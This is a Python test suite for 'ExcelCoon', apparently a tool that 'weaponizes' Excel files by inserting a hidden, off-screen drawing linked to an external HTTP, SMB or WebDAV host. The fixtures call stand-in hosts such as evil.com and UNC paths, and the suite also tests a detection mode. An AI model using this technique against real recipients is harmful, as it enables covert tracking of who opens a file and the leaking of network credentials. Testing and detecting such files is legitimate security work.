#!/usr/bin/env python3
"""
Test suite for ExcelCoon

Run from the project root directory:
    python -m tests.test_excelcoon          # Run tests and auto-cleanup
    python -m tests.test_excelcoon --keep   # Run tests and keep output files

Or directly:
    python tests/test_excelcoon.py
"""

import json
import os
import re
import subprocess
import sys
import zipfile
import tempfile
from pathlib import Path

# Ensure the project root is on sys.path so we can import excelcoon
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

# Python executable for subprocess-based CLI tests
PYTHON = sys.executable
EXCELCOON = str(PROJECT_ROOT / "excelcoon.py")


# ============================================================================
# FIXTURES - Test file creation helpers
# ============================================================================

def create_minimal_xlsx(output_path):
    """Create a minimal valid XLSX file for testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        os.makedirs(os.path.join(temp_dir, "xl", "worksheets"), exist_ok=True)
        os.makedirs(os.path.join(temp_dir, "_rels"), exist_ok=True)
        os.makedirs(os.path.join(temp_dir, "xl", "_rels"), exist_ok=True)

        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
    <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>'''

        root_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''

        workbook = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <sheets>
        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>'''

        workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>'''

        worksheet = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData>
        <row r="1">
            <c r="A1" t="inlineStr">
                <is><t>Test Excel File</t></is>
            </c>
        </row>
        <row r="2">
            <c r="A2" t="inlineStr">
                <is><t>This is a test file for ExcelCoon</t></is>
            </c>
        </row>
    </sheetData>
</worksheet>'''

        with open(os.path.join(temp_dir, "[Content_Types].xml"), 'w', encoding='utf-8') as f:
            f.write(content_types)
        with open(os.path.join(temp_dir, "_rels", ".rels"), 'w', encoding='utf-8') as f:
            f.write(root_rels)
        with open(os.path.join(temp_dir, "xl", "workbook.xml"), 'w', encoding='utf-8') as f:
            f.write(workbook)
        with open(os.path.join(temp_dir, "xl", "_rels", "workbook.xml.rels"), 'w', encoding='utf-8') as f:
            f.write(workbook_rels)
        with open(os.path.join(temp_dir, "xl", "worksheets", "sheet1.xml"), 'w', encoding='utf-8') as f:
            f.write(worksheet)

        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arc_name = os.path.relpath(file_path, temp_dir).replace(os.sep, '/')
                    zf.write(file_path, arc_name)
    return True


def create_xlsx_with_hyperlinks(output_path):
    """Create a minimal XLSX with existing hyperlink relationships."""
    with tempfile.TemporaryDirectory() as temp_dir:
        os.makedirs(os.path.join(temp_dir, "xl", "worksheets", "_rels"), exist_ok=True)
        os.makedirs(os.path.join(temp_dir, "_rels"), exist_ok=True)
        os.makedirs(os.path.join(temp_dir, "xl", "_rels"), exist_ok=True)

        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
    <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>'''

        root_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''

        workbook = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <sheets>
        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>'''

        workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>'''

        worksheet = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <sheetData>
        <row r="1">
            <c r="A1" t="inlineStr">
                <is><t>Click here</t></is>
            </c>
        </row>
    </sheetData>
    <hyperlinks>
        <hyperlink ref="A1" r:id="rId1"/>
    </hyperlinks>
</worksheet>'''

        sheet_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/>
</Relationships>'''

        with open(os.path.join(temp_dir, "[Content_Types].xml"), 'w', encoding='utf-8') as f:
            f.write(content_types)
        with open(os.path.join(temp_dir, "_rels", ".rels"), 'w', encoding='utf-8') as f:
            f.write(root_rels)
        with open(os.path.join(temp_dir, "xl", "workbook.xml"), 'w', encoding='utf-8') as f:
            f.write(workbook)
        with open(os.path.join(temp_dir, "xl", "_rels", "workbook.xml.rels"), 'w', encoding='utf-8') as f:
            f.write(workbook_rels)
        with open(os.path.join(temp_dir, "xl", "worksheets", "sheet1.xml"), 'w', encoding='utf-8') as f:
            f.write(worksheet)
        with open(os.path.join(temp_dir, "xl", "worksheets", "_rels", "sheet1.xml.rels"), 'w', encoding='utf-8') as f:
            f.write(sheet_rels)

        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arc_name = os.path.relpath(file_path, temp_dir).replace(os.sep, '/')
                    zf.write(file_path, arc_name)
    return True


# ============================================================================
# CLI helper
# ============================================================================

def run_cli(*args):
    """Run excelcoon.py as a subprocess and return (returncode, stdout, stderr)."""
    cmd = [PYTHON, EXCELCOON] + list(args)
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=str(PROJECT_ROOT))
    return result.returncode, result.stdout, result.stderr


# ============================================================================
# CORE TESTS - weaponize_excel_file() and construct_external_resource_url()
# ============================================================================

def test_weaponize_http(test_file):
    """Test HTTP mode weaponization."""
    from excelcoon import weaponize_excel_file, construct_external_resource_url

    output = str(PROJECT_ROOT / "test_out_http.xlsx")
    try:
        url = construct_external_resource_url("http", "localhost:8080")
        assert url.startswith("http://localhost:8080/"), f"Unexpected URL: {url}"

        success = weaponize_excel_file(test_file, output, url)
        assert success, "Weaponization returned False"
        assert os.path.exists(output), "Output file not created"

        with zipfile.ZipFile(output, 'r') as zf:
            names = zf.namelist()
            assert 'xl/drawings/drawing1.xml' in names, "Drawing missing"
            assert 'xl/drawings/_rels/drawing1.xml.rels' in names, "Drawing rels missing"
            assert all('\\' not in n for n in names), "Backslash in ZIP paths"

            rels = zf.read('xl/drawings/_rels/drawing1.xml.rels').decode()
            assert 'TargetMode="External"' in rels, "External target mode missing"
            assert 'localhost:8080' in rels, "Host not found in rels"

        return True
    finally:
        if os.path.exists(output):
            os.remove(output)


def test_weaponize_smb(test_file):
    """Test SMB mode weaponization."""
    from excelcoon import weaponize_excel_file, construct_external_resource_url

    output = str(PROJECT_ROOT / "test_out_smb.xlsx")
    try:
        url = construct_external_resource_url("smb", "192.168.1.50")
        assert url.startswith("\\\\192.168.1.50\\"), f"Unexpected URL: {url}"
        assert "//" not in url, "Forward slashes in SMB path"

        success = weaponize_excel_file(test_file, output, url)
        assert success
        assert os.path.exists(output)

        with zipfile.ZipFile(output, 'r') as zf:
            rels = zf.read('xl/drawings/_rels/drawing1.xml.rels').decode()
            assert '192.168.1.50' in rels

        return True
    finally:
        if os.path.exists(output):
            os.remove(output)


def test_weaponize_webdav(test_file):
    """Test WebDAV mode weaponization."""
    from excelcoon import weaponize_excel_file, construct_external_resource_url

    output = str(PROJECT_ROOT / "test_out_webdav.xlsx")
    try:
        url = construct_external_resource_url("webdav", "evil.com", use_https=False)
        assert "@80\\" in url, f"Missing @80 port specifier: {url}"

        url_ssl = construct_external_resource_url("webdav", "evil.com", use_https=True)
        assert "@SSL\\" in url_ssl, f"Missing @SSL specifier: {url_ssl}"

        success = weaponize_excel_file(test_file, output, url)
        assert success

        with zipfile.ZipFile(output, 'r') as zf:
            rels = zf.read('xl/drawings/_rels/drawing1.xml.rels').decode()
            assert 'evil.com' in rels

        return True
    finally:
        if os.path.exists(output):
            os.remove(output)


def test_existing_drawing(test_file):
    """Test injection into a file that already has a drawing (double weaponization)."""
    from excelcoon import weaponize_excel_file, construct_external_resource_url

    intermediate = str(PROJECT_ROOT / "test_intermediate.xlsx")
    output = str(PROJECT_ROOT / "test_out_existing.xlsx")

    try:
        url1 = construct_external_resource_url("http", "first.com")
        assert weaponize_excel_file(test_file, intermediate, url1)

        url2 = construct_external_resource_url("http", "second.com")
        assert weaponize_excel_file(intermediate, output, url2)

        with zipfile.ZipFile(output, 'r') as zf:
            names = zf.namelist()
            drawings = [n for n in names if n.startswith('xl/drawings/drawing') and n.endswith('.xml')]
            assert len(drawings) == 1, f"Expected 1 drawing, got {len(drawings)}"

            rels = zf.read('xl/drawings/_rels/drawing1.xml.rels').decode()
            rid_count = len(re.findall(r'Id="rId\d+"', rels))
            assert rid_count == 2, f"Expected 2 rels, got {rid_count}"

            drawing_xml = zf.read('xl/drawings/drawing1.xml').decode()
            anchors = drawing_xml.count('<xdr:twoCellAnchor')
            assert anchors == 2, f"Expected 2 anchors, got {anchors}"

        return True
    finally:
        for f in [intermediate, output]:
            if os.path.exists(f):
                os.remove(f)


def test_rid_collision(test_file):
    """Test that injection avoids rId collisions with existing hyperlinks."""
    from excelcoon import weaponize_excel_file, construct_external_resource_url

    hyperlink_file = str(PROJECT_ROOT / "test_hyperlink.xlsx")
    output = str(PROJECT_ROOT / "test_out_rid.xlsx")

    try:
        create_xlsx_with_hyperlinks(hyperlink_file)
        url = construct_external_resource_url("http", "tracker.io")
        assert weaponize_excel_file(hyperlink_file, output, url)

        with zipfile.ZipFile(output, 'r') as zf:
            rels = zf.read('xl/worksheets/_rels/sheet1.xml.rels').decode()
            rids = re.findall(r'Id="(rId\d+)"', rels)
            assert len(rids) == len(set(rids)), f"Duplicate rIds: {rids}"
            assert "rId1" in rids, "Original hyperlink rId1 missing"

            # Drawing should use rId2 (not rId1)
            drawing_rid = [r for r, t in zip(rids, re.findall(r'Type="([^"]*)"', rels)) if 'drawing' in t]
            assert drawing_rid[0] != "rId1", "Drawing collided with hyperlink rId1"

        return True
    finally:
        for f in [hyperlink_file, output]:
            if os.path.exists(f):
                os.remove(f)


def test_custom_path():
    """Test custom path handling (leading slashes, special characters)."""
    from excelcoon import construct_external_resource_url

    # Leading slash should be stripped
    url = construct_external_resource_url("http", "host.com", custom_path="/images/logo.png")
    assert url == "http://host.com/images/logo.png", f"Got: {url}"

    # No leading slash
    url = construct_external_resource_url("http", "host.com", custom_path="assets/img.png")
    assert url == "http://host.com/assets/img.png", f"Got: {url}"

    # SMB with custom path
    url = construct_external_resource_url("smb", "10.0.0.1", custom_path="share/secret.docx")
    assert url == "\\\\10.0.0.1\\share\\secret.docx", f"Got: {url}"

    # WebDAV with SSL
    url = construct_external_resource_url("webdav", "srv.io", custom_path="d/f.png", use_https=True)
    assert url == "\\\\srv.io@SSL\\d\\f.png", f"Got: {url}"

    # HTTPS mode
    url = construct_external_resource_url("http", "host.com", custom_path="t.png", use_https=True)
    assert url == "https://host.com/t.png", f"Got: {url}"

    return True


def test_url_xml_escaping(test_file):
    """Test that special XML characters in URLs are properly escaped."""
    from excelcoon import weaponize_excel_file

    output = str(PROJECT_ROOT / "test_out_escape.xlsx")
    try:
        # URL with & and other XML-special chars
        url = "http://evil.com/track?id=123&session=abc&foo=<bar>"
        success = weaponize_excel_file(test_file, output, url)
        assert success

        with zipfile.ZipFile(output, 'r') as zf:
            rels = zf.read('xl/drawings/_rels/drawing1.xml.rels').decode()
            # & must be escaped as &amp;
            assert '&amp;' in rels, "& not escaped in XML"
            assert '&lt;' in rels, "< not escaped in XML"
            assert '&gt;' in rels, "> not escaped in XML"
            # Raw & should NOT appear (would be invalid XML)
            # Check that it's valid by looking for unescaped &
            assert '&session' not in rels, "Unescaped & found"

        return True
    finally:
        if os.path.exists(output):
            os.remove(output)


def test_sample_file():
    """Test weaponization of the included multi-sheet sample file."""
    from excelcoon import weaponize_excel_file, construct_external_resource_url

    sample = PROJECT_ROOT / "samples" / "sample.xlsx"
    output = str(PROJECT_ROOT / "test_out_sample.xlsx")

    if not sample.exists():
        print("    [skip] samples/sample.xlsx not present")
        return True

    try:
        url = construct_external_resource_url("http", "example.com")
        assert weaponize_excel_file(str(sample), output, url)

        with zipfile.ZipFile(output, 'r') as zf:
            names = zf.namelist()
            assert 'xl/worksheets/sheet1.xml' in names, "Sheet1 missing"
            assert 'xl/worksheets/sheet2.xml' in names, "Sheet2 missing after weaponization"
            assert 'xl/drawings/drawing1.xml' in names, "Drawing missing"
            assert 'xl/sharedStrings.xml' in names, "SharedStrings lost"

        return True
    finally:
        if os.path.exists(output):
            os.remove(output)


# ============================================================================
# VALIDATION TESTS - validate_host(), validate_input_file(), generate_output_name()
# ============================================================================

def test_validate_host():
    """Test host validation logic."""
    from excelcoon import validate_host

    # Valid hosts
    assert validate_host("example.com") is None
    assert validate_host("192.168.1.1") is None
    assert validate_host("10.0.0.1:8080") is None
    assert validate_host("my-server.local") is None

    # Invalid: empty
    assert validate_host("") is not None
    assert validate_host("   ") is not None

    # Invalid: protocol prefix
    assert validate_host("http://example.com") is not None
    assert validate_host("https://foo.bar") is not None
    assert validate_host("//foo.bar") is not None

    # Invalid: special characters
    assert validate_host("host with spaces") is not None
    assert validate_host('host"quoted') is not None
    assert validate_host("host<tag>") is not None

    return True


def test_validate_input_file():
    """Test input file validation logic."""
    from excelcoon import validate_input_file

    # Non-existent file
    assert "not found" in validate_input_file("nonexistent_xyz.xlsx").lower()

    # Directory instead of file
    assert validate_input_file(str(PROJECT_ROOT / "tests")) is not None

    # Wrong extension
    wrong_ext = str(PROJECT_ROOT / "test_wrong_ext.txt")
    try:
        with open(wrong_ext, 'w') as f:
            f.write("not excel")
        assert ".xlsx" in validate_input_file(wrong_ext).lower()
    finally:
        if os.path.exists(wrong_ext):
            os.remove(wrong_ext)

    # Empty file
    empty_file = str(PROJECT_ROOT / "test_empty.xlsx")
    try:
        with open(empty_file, 'w') as f:
            pass
        assert "empty" in validate_input_file(empty_file).lower()
    finally:
        if os.path.exists(empty_file):
            os.remove(empty_file)

    # Corrupt ZIP
    corrupt_file = str(PROJECT_ROOT / "test_corrupt.xlsx")
    try:
        with open(corrupt_file, 'wb') as f:
            f.write(b"this is not a zip file at all")
        assert "corrupt" in validate_input_file(corrupt_file).lower() or "not a valid" in validate_input_file(corrupt_file).lower()
    finally:
        if os.path.exists(corrupt_file):
            os.remove(corrupt_file)

    # Valid file should return None
    valid_file = str(PROJECT_ROOT / "test_valid_check.xlsx")
    try:
        create_minimal_xlsx(valid_file)
        assert validate_input_file(valid_file) is None
    finally:
        if os.path.exists(valid_file):
            os.remove(valid_file)

    return True


def test_generate_output_name():
    """Test automatic output filename generation."""
    from excelcoon import generate_output_name

    # Basic case
    assert generate_output_name("report.xlsx").endswith("report_weaponized.xlsx")

    # With directory path
    result = generate_output_name("/path/to/data.xlsx")
    assert "data_weaponized.xlsx" in result

    # Already weaponized (should not double-stack)
    result = generate_output_name("file_weaponized.xlsx")
    assert "weaponized_2" in result

    # Windows-style path
    result = generate_output_name("C:\\Users\\doc\\file.xlsx")
    assert "file_weaponized.xlsx" in result

    return True


# ============================================================================
# CLI TESTS - subprocess-based integration tests
# ============================================================================

def test_cli_help():
    """Test that --help works and shows expected content."""
    code, stdout, stderr = run_cli("--help")
    assert code == 0, f"Help exited with code {code}"
    assert "ExcelCoon" in stdout
    assert "--input" in stdout
    assert "--mode" in stdout
    assert "--host" in stdout
    assert "--check" in stdout or "check" in stdout
    assert "batch" in stdout.lower() or "glob" in stdout.lower()
    return True


def test_cli_missing_args():
    """Test that missing required args produces helpful errors."""
    code, stdout, stderr = run_cli("-i", "foo.xlsx")
    assert code != 0, "Should fail with missing args"
    assert "required" in stderr.lower() or "error" in stderr.lower()
    return True


def test_cli_invalid_file():
    """Test CLI error handling for non-existent input file."""
    code, stdout, stderr = run_cli("-i", "no_such_file.xlsx", "-m", "http", "-H", "x.com")
    assert code != 0
    combined = stdout + stderr
    assert "not found" in combined.lower() or "no matching" in combined.lower()
    return True


def test_cli_invalid_host():
    """Test CLI error handling for invalid host."""
    test_file = str(PROJECT_ROOT / "test_cli_host.xlsx")
    try:
        create_minimal_xlsx(test_file)
        code, stdout, stderr = run_cli("-i", test_file, "-m", "http", "-H", "http://bad.com")
        assert code != 0
        combined = stdout + stderr
        assert "protocol" in combined.lower() or "invalid" in combined.lower()
        return True
    finally:
        if os.path.exists(test_file):
            os.remove(test_file)


def test_cli_json_output():
    """Test --json flag produces valid JSON with expected structure."""
    test_file = str(PROJECT_ROOT / "test_cli_json.xlsx")
    try:
        create_minimal_xlsx(test_file)
        code, stdout, stderr = run_cli("-i", test_file, "-m", "http", "-H", "j.com", "--json")
        assert code == 0, f"JSON mode failed: {stderr}"

        data = json.loads(stdout)
        assert "results" in data
        assert "summary" in data
        assert len(data["results"]) == 1
        assert data["results"][0]["success"] is True
        assert data["results"][0]["mode"] == "http"
        assert "j.com" in data["results"][0]["url"]
        assert data["summary"]["succeeded"] == 1
        assert data["summary"]["failed"] == 0

        # Clean up generated output
        output_file = data["results"][0]["output"]
        if os.path.exists(output_file):
            os.remove(output_file)

        return True
    finally:
        if os.path.exists(test_file):
            os.remove(test_file)


def test_cli_quiet_mode():
    """Test --quiet flag suppresses all output."""
    test_file = str(PROJECT_ROOT / "test_cli_quiet.xlsx")
    try:
        create_minimal_xlsx(test_file)
        code, stdout, stderr = run_cli("-i", test_file, "-m", "http", "-H", "q.com", "-q")
        assert code == 0, f"Quiet mode failed: {stderr}"
        assert stdout.strip() == "", f"Quiet mode produced output: {stdout!r}"

        # Clean up
        from excelcoon import generate_output_name
        out = generate_output_name(test_file)
        if os.path.exists(out):
            os.remove(out)
        return True
    finally:
        if os.path.exists(test_file):
            os.remove(test_file)


def test_cli_check_clean():
    """Test --check on a clean file reports CLEAN."""
    test_file = str(PROJECT_ROOT / "test_cli_check.xlsx")
    try:
        create_minimal_xlsx(test_file)
        code, stdout, stderr = run_cli("--check", test_file)
        assert code == 0, f"Check mode failed: {stderr}"
        assert "CLEAN" in stdout
        return True
    finally:
        if os.path.exists(test_file):
            os.remove(test_file)


def test_cli_check_weaponized():
    """Test --check on a weaponized file reports WEAPONIZED."""
    from excelcoon import weaponize_excel_file, construct_external_resource_url

    test_file = str(PROJECT_ROOT / "test_cli_checkw.xlsx")
    output_file = str(PROJECT_ROOT / "test_cli_checkw_out.xlsx")
    try:
        create_minimal_xlsx(test_file)
        url = construct_external_resource_url("http", "canary.io")
        weaponize_excel_file(test_file, output_file, url)

        code, stdout, stderr = run_cli("--check", output_file)
        assert code == 0
        assert "WEAPONIZED" in stdout
        assert "canary.io" in stdout
        assert "HTTP tracking" in stdout

        return True
    finally:
        for f in [test_file, output_file]:
            if os.path.exists(f):
                os.remove(f)


def test_cli_auto_output_name():
    """Test that omitting -o generates <name>_weaponized.xlsx."""
    test_file = str(PROJECT_ROOT / "test_cli_auto.xlsx")
    expected_output = str(PROJECT_ROOT / "test_cli_auto_weaponized.xlsx")
    try:
        create_minimal_xlsx(test_file)
        code, stdout, stderr = run_cli("-i", test_file, "-m", "http", "-H", "a.com", "--json")
        assert code == 0, f"Failed: {stderr}"

        data = json.loads(stdout)
        actual_output = data["results"][0]["output"]
        assert "test_cli_auto_weaponized.xlsx" in actual_output
        assert os.path.exists(actual_output)

        if os.path.exists(actual_output):
            os.remove(actual_output)
        return True
    finally:
        if os.path.exists(test_file):
            os.remove(test_file)
        if os.path.exists(expected_output):
            os.remove(expected_output)


def test_cli_batch_mode():
    """Test batch mode with glob patterns."""
    batch_dir = PROJECT_ROOT / "test_batch_dir"
    batch_dir.mkdir(exist_ok=True)

    files = []
    try:
        for i in range(3):
            f = str(batch_dir / f"batch_{i}.xlsx")
            create_minimal_xlsx(f)
            files.append(f)

        pattern = str(batch_dir / "batch_*.xlsx")
        code, stdout, stderr = run_cli("-i", pattern, "-m", "http", "-H", "b.com", "--json")
        assert code == 0, f"Batch failed: {stderr}"

        data = json.loads(stdout)
        assert data["summary"]["total"] == 3
        assert data["summary"]["succeeded"] == 3

        # Clean up outputs
        for r in data["results"]:
            if os.path.exists(r["output"]):
                os.remove(r["output"])

        return True
    finally:
        import shutil
        if batch_dir.exists():
            shutil.rmtree(batch_dir)


# ============================================================================
# EDGE CASE TESTS
# ============================================================================

def test_weaponize_nonexistent_file():
    """Test weaponize_excel_file with non-existent input."""
    from excelcoon import weaponize_excel_file
    result = weaponize_excel_file("does_not_exist.xlsx", "out.xlsx", "http://x.com/a.png")
    assert result is False
    assert not os.path.exists("out.xlsx")
    return True


def test_weaponize_corrupt_file():
    """Test weaponize_excel_file with a corrupt/non-ZIP file."""
    from excelcoon import weaponize_excel_file

    corrupt = str(PROJECT_ROOT / "test_corrupt_input.xlsx")
    output = str(PROJECT_ROOT / "test_corrupt_output.xlsx")
    try:
        with open(corrupt, 'wb') as f:
            f.write(b"NOT A ZIP FILE " * 10)

        result = weaponize_excel_file(corrupt, output, "http://x.com/a.png")
        assert result is False
        return True
    finally:
        for f in [corrupt, output]:
            if os.path.exists(f):
                os.remove(f)


def test_offscreen_coordinates():
    """Test that generated coordinates are far off-screen."""
    from excelcoon import generate_offscreen_cell_coordinates

    for _ in range(100):
        col_start, row_start, col_end, row_end = generate_offscreen_cell_coordinates()
        assert col_start >= 100, f"Column too small: {col_start}"
        assert row_start >= 500, f"Row too small: {row_start}"
        assert col_end == col_start + 1
        assert row_end == row_start + 1

    return True


def test_unknown_mode():
    """Test that an unknown mode returns None."""
    from excelcoon import construct_external_resource_url
    result = construct_external_resource_url("ftp", "host.com")
    assert result is None
    return True


def test_resolve_input_files():
    """Test the glob-based file resolver."""
    from excelcoon import resolve_input_files

    # Non-existent single file
    assert resolve_input_files("nonexistent_abc.xlsx") == []

    # Existing file
    sample = str(PROJECT_ROOT / "samples" / "sample.xlsx")
    if os.path.exists(sample):
        result = resolve_input_files(sample)
        assert len(result) == 1
        assert result[0] == sample

    return True


# ============================================================================
# TEST RUNNER
# ============================================================================

def main():
    keep_files = '--keep' in sys.argv

    print("=" * 64)
    print("  ExcelCoon Test Suite")
    print("=" * 64)

    # Create base test file
    test_file = str(PROJECT_ROOT / "test_base.xlsx")
    create_minimal_xlsx(test_file)

    # Define all tests grouped by category
    tests = [
        # Core functionality
        ("core/http", lambda: test_weaponize_http(test_file)),
        ("core/smb", lambda: test_weaponize_smb(test_file)),
        ("core/webdav", lambda: test_weaponize_webdav(test_file)),
        ("core/existing-drawing", lambda: test_existing_drawing(test_file)),
        ("core/rid-collision", lambda: test_rid_collision(test_file)),
        ("core/custom-path", test_custom_path),
        ("core/xml-escaping", lambda: test_url_xml_escaping(test_file)),
        ("core/sample-file", test_sample_file),
        # Validation
        ("validate/host", test_validate_host),
        ("validate/input-file", test_validate_input_file),
        ("validate/output-name", test_generate_output_name),
        # CLI integration
        ("cli/help", test_cli_help),
        ("cli/missing-args", test_cli_missing_args),
        ("cli/invalid-file", test_cli_invalid_file),
        ("cli/invalid-host", test_cli_invalid_host),
        ("cli/json-output", test_cli_json_output),
        ("cli/quiet-mode", test_cli_quiet_mode),
        ("cli/check-clean", test_cli_check_clean),
        ("cli/check-weaponized", test_cli_check_weaponized),
        ("cli/auto-output-name", test_cli_auto_output_name),
        ("cli/batch-mode", test_cli_batch_mode),
        # Edge cases
        ("edge/nonexistent-file", test_weaponize_nonexistent_file),
        ("edge/corrupt-file", test_weaponize_corrupt_file),
        ("edge/offscreen-coords", test_offscreen_coordinates),
        ("edge/unknown-mode", test_unknown_mode),
        ("edge/resolve-files", test_resolve_input_files),
    ]

    results = []
    for name, test_fn in tests:
        try:
            passed = test_fn()
            assert passed, "Test returned non-True value"
            results.append((name, True, None))
            print(f"  [PASS] {name}")
        except Exception as e:
            results.append((name, False, str(e)))
            print(f"  [FAIL] {name}: {e}")

    # Cleanup base file
    if os.path.exists(test_file):
        os.remove(test_file)

    # Summary
    passed = sum(1 for _, ok, _ in results if ok)
    failed = sum(1 for _, ok, _ in results if not ok)
    total = len(results)

    print()
    print("=" * 64)
    print(f"  Results: {passed}/{total} passed, {failed} failed")
    print("=" * 64)

    if failed > 0:
        print("\n  Failed tests:")
        for name, ok, err in results:
            if not ok:
                print(f"    - {name}: {err}")

    print()
    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
